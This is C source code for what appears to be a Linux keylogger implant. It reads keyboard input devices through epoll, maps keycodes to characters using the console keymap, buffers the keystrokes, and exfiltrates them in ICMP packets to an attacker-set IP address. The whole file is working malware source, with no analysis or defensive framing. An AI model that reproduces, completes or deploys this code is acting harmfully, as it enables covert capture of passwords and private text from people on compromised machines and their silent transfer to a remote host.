#include "implant.h"

#include <fcntl.h>
#include <linux/input.h>
#include <linux/kd.h>
#include <linux/keyboard.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>

#define MAX_EVENTS 16
#define KEYMAP_SIZE 256

typedef struct {
    char normal[KEYMAP_SIZE];
    char shifted[KEYMAP_SIZE];
} keymap_cache_t;

static int
open_console(void) {
    const char *consoles[] = {"/dev/tty0", "/dev/console", "/dev/tty", NULL};

    for (int i = 0; consoles[i] != NULL; i++) {
        int fd = open(consoles[i], O_RDONLY | O_NOCTTY);
        if (fd >= 0)
            return fd;
    }
    return -1;
}

static void
cache_keymap(int console_fd, keymap_cache_t *cache) {
    struct kbentry entry = {0};

    memset(cache, 0, sizeof(*cache));

    cache->normal[KEY_ENTER] = '\n';
    cache->normal[KEY_KPENTER] = '\n';
    cache->normal[KEY_TAB] = '\t';
    cache->normal[KEY_SPACE] = ' ';
    cache->shifted[KEY_ENTER] = '\n';
    cache->shifted[KEY_KPENTER] = '\n';
    cache->shifted[KEY_TAB] = '\t';
    cache->shifted[KEY_SPACE] = ' ';

    for (int code = 0; code < KEYMAP_SIZE; code++) {
        if (cache->normal[code] != 0)
            continue;

        entry.kb_table = K_NORMTAB;
        entry.kb_index = (unsigned char)code;
        if (ioctl(console_fd, KDGKBENT, &entry) == 0) {
            unsigned char type = KTYP(entry.kb_value);
            if (type == KT_LETTER || type == KT_LATIN)
                cache->normal[code] = (char)KVAL(entry.kb_value);
        }

        entry.kb_table = K_SHIFTTAB;
        entry.kb_index = (unsigned char)code;
        if (ioctl(console_fd, KDGKBENT, &entry) == 0) {
            unsigned char type = KTYP(entry.kb_value);
            if (type == KT_LETTER || type == KT_LATIN)
                cache->shifted[code] = (char)KVAL(entry.kb_value);
        }
    }
}

static char
keycode_to_char(keymap_cache_t *cache, uint16_t code, int shift_held) {
    if (code >= KEYMAP_SIZE)
        return 0;

    return shift_held ? cache->shifted[code] : cache->normal[code];
}

static void
flush_buffer(ringbuf_t *rb, const int8_t *dst_ip) {
    uint8_t payload[ICMP_DATA_SIZE] = {0};
    size_t bytes_read;

    bytes_read = ringbuf_read(rb, payload, ICMP_DATA_SIZE);
    if (bytes_read > 0) {
#ifdef DEBUG
        DEBUG_LOG("[>] Sending %zu bytes to %s: \"%.*s\"\n", bytes_read, dst_ip, (int)bytes_read, payload);
#endif
        icmp_send(dst_ip, payload, bytes_read);
    }
}

static void
handle_key_event(keymap_cache_t *cache, struct input_event *ev, ringbuf_t *rb, int *shift_held) {
    char ch;

    if (ev->type != EV_KEY)
        return;

    if (ev->code == KEY_LEFTSHIFT || ev->code == KEY_RIGHTSHIFT) {
        *shift_held = (ev->value != KEY_RELEASED);
        return;
    }

    if (ev->value != KEY_PRESSED)
        return;

    ch = keycode_to_char(cache, ev->code, *shift_held);
    if (ch != 0)
        ringbuf_push(rb, (uint8_t)ch);
}

static int
setup_epoll(implant_t *instance) {
    keyboard_t *kbd;
    struct epoll_event ev;
    int epfd;

    epfd = epoll_create1(0);
    if (epfd < 0)
        return -1;

    TAILQ_FOREACH(kbd, &instance->kbd, devices) {
        ev.events = EPOLLIN;
        ev.data.fd = kbd->fd;
        if (epoll_ctl(epfd, EPOLL_CTL_ADD, kbd->fd, &ev) < 0) {
#ifdef DEBUG
            DEBUG_LOG("epoll_ctl failed for fd %d\n", kbd->fd);
#endif
            continue;
        }
    }

    return epfd;
}

uint8_t
evloop_run(implant_t *instance) {
    struct epoll_event events[MAX_EVENTS];
    struct input_event ev;
    keymap_cache_t keymap = {0};
    ringbuf_t ringbuf = {0};
    int console_fd;
    int epfd;
    int shift_held = 0;
    int nfds;

    if (!instance)
        return ERROR;

    console_fd = open_console();
    if (console_fd < 0) {
#ifdef DEBUG
        DEBUG_LOG("evloop: could not open console\n");
#endif
        return ERROR;
    }

    cache_keymap(console_fd, &keymap);
    close(console_fd);

    ringbuf_init(&ringbuf);

    epfd = setup_epoll(instance);
    if (epfd < 0) {
#ifdef DEBUG
        DEBUG_LOG("evloop: epoll_create1 failed\n");
#endif
        return ERROR;
    }

    for (;;) {
        nfds = epoll_wait(epfd, events, MAX_EVENTS, -1);
        if (nfds < 0) {
#ifdef DEBUG
            DEBUG_LOG("evloop: epoll_wait failed\n");
#endif
            continue;
        }

        for (int i = 0; i < nfds; i++) {
            ssize_t bytes = read(events[i].data.fd, &ev, sizeof(ev));
            if (bytes != sizeof(ev))
                continue;

            handle_key_event(&keymap, &ev, &ringbuf, &shift_held);

#ifdef DEBUG
            DEBUG_LOG("[*] Buffer: count=%zu, head=%zu, tail=%zu, data=\"%.*s\"\n",
                      ringbuf.count, ringbuf.head, ringbuf.tail,
                      (int)ringbuf.count, ringbuf.data + ringbuf.tail);
#endif

            if (ringbuf_should_flush(&ringbuf))
                flush_buffer(&ringbuf, instance->ip);
        }
    }
}
